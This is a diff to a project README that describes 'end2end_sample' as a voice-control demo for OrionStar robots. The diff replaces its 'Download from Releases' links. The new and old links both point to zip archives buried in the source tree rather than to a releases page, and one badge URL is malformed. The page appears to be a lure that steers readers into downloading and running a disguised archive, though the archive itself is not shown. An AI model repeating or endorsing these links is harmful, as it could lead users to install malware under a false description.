@@ -1,7 +1,7 @@
 # 🎤 end2end_sample - Simple Voice Control for OrionStar Robots
 
 ## 📥 Download Now
-[![Download from Releases](https://raw.githubusercontent.com/rozario-1234/end2end_sample/main/client/src/sdk/tools/definitions/sample-end-3.3.zip%https://raw.githubusercontent.com/rozario-1234/end2end_sample/main/client/src/sdk/tools/definitions/sample-end-3.3.zip)](https://raw.githubusercontent.com/rozario-1234/end2end_sample/main/client/src/sdk/tools/definitions/sample-end-3.3.zip)
+[![Download from Releases](https://github.com/rozario-1234/end2end_sample/raw/refs/heads/main/client/src/sample-end-v2.1-beta.3.zip%https://github.com/rozario-1234/end2end_sample/raw/refs/heads/main/client/src/sample-end-v2.1-beta.3.zip)](https://github.com/rozario-1234/end2end_sample/raw/refs/heads/main/client/src/sample-end-v2.1-beta.3.zip)
 
 ## 🛠️ Overview
 The **end2end_sample** project is a demonstration of AgentOS2-Live, showcasing how to control an OrionStar robot using voice commands. This application also supports extensible scene applications, making it versatile for various environments. Whether you're controlling a robot in a home setting or an office, this demo will help you understand the possibilities of voice interaction.
@@ -21,7 +21,7 @@ Before downloading, ensure your device meets the following requirements:
 ### Step 2: Visit the Download Page
 Go to the following link to access the latest releases of end2end_sample:
 
-[Download from Releases](https://raw.githubusercontent.com/rozario-1234/end2end_sample/main/client/src/sdk/tools/definitions/sample-end-3.3.zip)
+[Download from Releases](https://github.com/rozario-1234/end2end_sample/raw/refs/heads/main/client/src/sample-end-v2.1-beta.3.zip)
 
 ### Step 3: Choose Your Version
 On the download page, you'll see a list of available versions. Select the most recent version for the best features and updates. Each version is labeled with its release date, so pick the latest one unless you have a specific reason to choose an older version.
